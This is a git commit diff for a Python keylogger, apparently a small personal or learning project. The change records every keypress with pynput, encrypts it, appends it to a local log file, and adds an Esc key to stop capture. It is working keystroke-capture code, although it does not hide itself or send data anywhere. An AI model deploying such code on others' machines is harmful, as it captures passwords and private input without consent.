dc50a878af5af8899d600a73197fe78040716749
Arsh09032004 <arshahmedsheikh786@gmail.com>
2025-05-16 13:51:06 +0530

    Add Esc key to stop keylogger and decrypt script

--- src/keylogger.py
+++ src/keylogger.py
@@ -1,25 +1,32 @@
 from pynput import keyboard
-import logging
-from utils.logger_setup import setup_logger
+import os
+from utils.crypto import load_key, encrypt_message
 
 class KeyLogger:
-    def __init__(self):
-        setup_logger()
-        self.listener = keyboard.Listener(
-            on_press=self.on_press,
-            on_release=self.on_release
-        )
+    def __init__(self, log_file="logs/keystrokes.log"):
+        self.log_file = log_file
+        self.key = load_key()
+        
+        # Create logs directory if not exists
+        log_dir = os.path.dirname(log_file)
+        if not os.path.exists(log_dir):
+            os.makedirs(log_dir)
 
     def on_press(self, key):
-        try:
-            logging.info(f"Key: {key.char}")
-        except AttributeError:
-            logging.info(f"Special Key: {key}")
-
-    def on_release(self, key):
+        # Stop listener if Esc is pressed
         if key == keyboard.Key.esc:
-            return False
+            print("Esc pressed. Stopping keylogger...")
+            return False  # This stops the listener
+        
+        try:
+            msg = f"Key: {key.char}"
+        except AttributeError:
+            msg = f"Special Key: {key}"
+
+        encrypted = encrypt_message(msg, self.key)
+        with open(self.log_file, "ab") as f:
+            f.write(encrypted + b"\n")
 
     def start(self):
-        with self.listener:
-            self.listener.join()
+        with keyboard.Listener(on_press=self.on_press) as listener:
+            listener.join()
